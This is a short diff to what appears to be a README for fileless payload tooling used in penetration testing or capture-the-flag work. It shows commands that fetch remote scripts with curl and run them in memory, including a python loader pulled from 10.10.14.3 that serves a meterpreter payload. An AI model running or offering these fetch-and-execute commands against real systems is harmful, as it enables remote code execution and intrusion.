@@ -12,7 +12,7 @@ bash <(curl -s https://raw.githubusercontent.com/carlospolop/privilege-escalatio
 ```
 but maybe something like this?
 ```bash
-python <(curl -s http://10.10.14.3/fileless.py) http://10.10.14.3/meterpreter
+FORK=1 python <(curl -s http://10.10.14.3/fileless.py) http://10.10.14.3/meterpreter
 ```
 
 ## [shellcode.py](shellcode.py)
